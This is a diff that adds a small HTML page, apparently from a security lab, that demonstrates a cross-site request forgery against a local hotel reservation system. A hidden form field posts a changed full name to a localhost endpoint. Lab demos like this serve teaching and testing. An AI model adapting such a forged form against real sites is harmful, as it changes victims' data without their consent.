@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Simulation</title>
+</head>
+<body>
+
+<h1>CSRF Attack Simulation</h1>
+
+<p>
+    Educational demonstration in a local
+    Hotel Reservation System.
+</p>
+
+<form id="attackForm"
+      action="http://localhost/hotel-quebec/security-labs/csrf.php"
+      method="POST">
+
+    <input type="hidden"
+           name="full_name"
+           value="Changed By CSRF Attack">
+
+    <button type="submit">
+        Run CSRF Simulation
+    </button>
+
+</form>
+
+</body>
+</html>
